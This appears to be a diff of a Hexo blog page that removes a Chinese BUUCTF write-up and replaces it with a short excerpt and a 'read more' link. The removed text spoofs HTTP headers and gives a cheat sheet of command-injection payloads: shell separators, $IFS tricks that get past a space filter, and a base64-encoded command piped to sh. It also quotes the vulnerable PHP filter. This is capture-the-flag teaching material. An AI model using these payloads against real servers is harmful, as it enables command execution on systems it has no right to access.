@@ -287,7 +287,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2020-12-27 00:02:43" itemprop="dateModified" datetime="2020-12-27T00:02:43+08:00">2020-12-27</time>
+        <time title="修改时间：2020-12-27 00:06:57" itemprop="dateModified" datetime="2020-12-27T00:06:57+08:00">2020-12-27</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -325,67 +325,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p><a target="_blank" rel="noopener" href="https://imgchr.com/i/r4N9d1"><img src="https://s3.ax1x.com/2020/12/26/r4N9d1.png" alt="r4N9d1.png"></a></p>
-<h2 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h2><p>先查看一波源代码，发现</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;border:none;cursor:default;&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;return false&quot;</span> <span class="attr">href</span>=<span class="string">&quot;Secret.php&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>因此去<code>secrect.pnp</code>看看</p>
-<h2 id="修改Referer"><a href="#修改Referer" class="headerlink" title="修改Referer"></a>修改Referer</h2><p><a target="_blank" rel="noopener" href="https://imgchr.com/i/r4NBWT"><img src="https://s3.ax1x.com/2020/12/26/r4NBWT.png" alt="r4NBWT.png"></a><br>看样子后面会出现UA等老套路了</p>
-<h2 id="修改UA"><a href="#修改UA" class="headerlink" title="修改UA"></a>修改UA</h2><p>果然出现了UA的修改，需要修改成对应的UA</p>
-<h2 id="修改X-Forwarded-For"><a href="#修改X-Forwarded-For" class="headerlink" title="修改X-Forwarded-For"></a>修改X-Forwarded-For</h2><p>比起<code>burp suite</code> 这些我更想用<code>fidder</code>。<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/r46zOP"><img src="https://s3.ax1x.com/2020/12/26/r46zOP.png" alt="r46zOP.png"></a><br>最后得到flag。</p>
-<h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p>看了题目<code>/?ip=</code>直接傻眼（逃），顶多看得懂其中有一个参数<code>ip</code>，但接下来手足无措。跑去查了题解，梳理了一下。</p>
-<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p><em>下面内容来源：<a target="_blank" rel="noopener" href="https://blog.csdn.net/vanarrow/article/details/108295481">https://blog.csdn.net/vanarrow/article/details/108295481</a></em></p>
-<h3 id="0、命令联合执行"><a href="#0、命令联合执行" class="headerlink" title="0、命令联合执行"></a>0、命令联合执行</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">;     前面的执行完执行后面的</span><br><span class="line">|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         </span><br><span class="line">||    当前面的执行出错时（为假）执行后面的</span><br><span class="line">&amp;     将任务置于后台执行</span><br><span class="line">&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真</span><br><span class="line">%0a  （换行）</span><br><span class="line">%0d  （回车）</span><br><span class="line"><span class="number">1234567</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="1、命令绕过空格方法有："><a href="#1、命令绕过空格方法有：" class="headerlink" title="1、命令绕过空格方法有："></a>1、命令绕过空格方法有：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$&#123;IFS&#125;$<span class="number">9</span></span><br><span class="line">&#123;IFS&#125;</span><br><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$<span class="number">1</span> //$<span class="number">1</span>改成$加其他数字貌似都行</span><br><span class="line">IFS</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line">%<span class="number">20</span>   (space)</span><br><span class="line">%09   (tab)</span><br><span class="line">X=$<span class="string">&#x27;cat\x09./flag.php&#x27;</span>;$X       （\x09表示tab，也可以用\x20）</span><br><span class="line"><span class="number">123456789101112</span></span><br><span class="line">ps:有时会禁用cat:</span><br><span class="line">解决方法是使用tac反向输出命令：</span><br><span class="line">linux命令中可以加\，所以甚至可以ca\t /fl\ag</span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="2、内联执行"><a href="#2、内联执行" class="headerlink" title="2、内联执行"></a>2、内联执行</h3><p>内联，就是将反引号内命令的输出作为输入执行</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS$9`ls`</span><br><span class="line"></span><br><span class="line">$IFS在Linux下表示为空格</span><br><span class="line">$<span class="number">9</span>是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字</span><br><span class="line"></span><br><span class="line">这里$IFS$<span class="number">9</span>或$IFS垂直，后面加个$与&#123;&#125;类似，起截断作用</span><br></pre></td></tr></table></figure>
-
-<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>梳理了CSDN网友的思路，总结一下</p>
-<h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><p>用 <code>|</code> 或者<code>;</code>执行命令</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;ls</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>/?ip=<br>PING 127.0.0.1 (127.0.0.1): 56 data bytes<br>flag.php<br>index.php</p>
-</blockquote>
-<h3 id="判断过滤字符"><a href="#判断过滤字符" class="headerlink" title="判断过滤字符"></a>判断过滤字符</h3><p>滤了空格和标点，flag等符号，不能直接cat flag</p>
-<p><code>cat flag</code>是何方神圣呢？<a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-cat.html">cat命令传送门</a></p>
-<blockquote>
-<p>/?ip= fxck your space!</p>
-</blockquote>
-<p>过滤了空格，用<code>$&#123;IFS&#125;$</code>代替</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$&#123;IFS&#125;flag.php </span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>fxck your symbol! 过滤{} </p>
-</blockquote>
-<p>也过滤了{}，用<code>$IFS$1</code>代替</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS$1flag.php</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>/?ip= fxck your flag!</p>
-</blockquote>
-<p>不读flag，读index</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS$1index.php</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>/?ip=<br>PING 127.0.0.1 (127.0.0.1): 56 data bytes<br>/?ip=<br>|&#39;|&quot;|\|(|)|[|]|{|}/“, $ip, $match)){<br>    echo preg_match(“/&amp;|/|?|*|&lt;|[\x{00}-\x{20}]|&gt;|&#39;|&quot;|\|(|)|[|]|{|}/“, $ip, $match);<br>    die(“fxck your symbol!”);<br>  } else if(preg_match(“/ /“, $ip)){<br>    die(“fxck your space!”);<br>  } else if(preg_match(“/bash/“, $ip)){<br>    die(“fxck your bash!”);<br>  } else if(preg_match(“/.*f.<em>l.*a.*g.</em>/“, $ip)){<br>    die(“fxck your flag!”);<br>  }<br>  $a = shell_exec(“ping -c 4 “.$ip);<br>  echo “<br>“;<br>  print_r($a);<br>}</p>
-<p>?&gt;</p>
-</blockquote>
-<p>一目了然过滤了啥，flag字眼也过滤了，bash也没了，不过sh没过滤：</p>
-<ul>
-<li>总结：过滤的特殊字符：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp; / ？ * &lt; x&#123;00&#125;-\x&#123;1f&#125; &#x27; &quot; \ () [] &#123;&#125;  空格</span><br><span class="line">&quot;xxxfxxxlxxxaxxxgxxx&quot; &quot; &quot; &quot;bash&quot; </span><br></pre></td></tr></table></figure>
-
-<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;<span class="built_in">echo</span>$IFS<span class="variable">$1Y2F0IGZsYWcucGhw</span>|base64$IFS<span class="variable">$1</span>-d|sh</span><br></pre></td></tr></table></figure>
-
-<p>然后查看源代码得flag</p>
-<h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>本篇大部分为转载</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/vanarrow/article/details/108295481">https://blog.csdn.net/vanarrow/article/details/108295481</a></p>
-<p>的内容，由于CTF思路确实需要参考。</p>
-<p>在后面挂一个很好的命令提示符漏洞绕过与执行的博客总结</p>
-<p><a target="_blank" rel="noopener" href="https://www.ghtwf01.cn/index.php/archives/273/">https://www.ghtwf01.cn/index.php/archives/273/</a></p>
-<p><del>学会绕过过滤的路还有好长的样子</del></p>
-
+          <p>顺便来了一波水题,发现不懂的领域</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/12/26/20201226%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0-BUUCTF%E5%B0%8F%E4%BD%93%E9%AA%8C/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
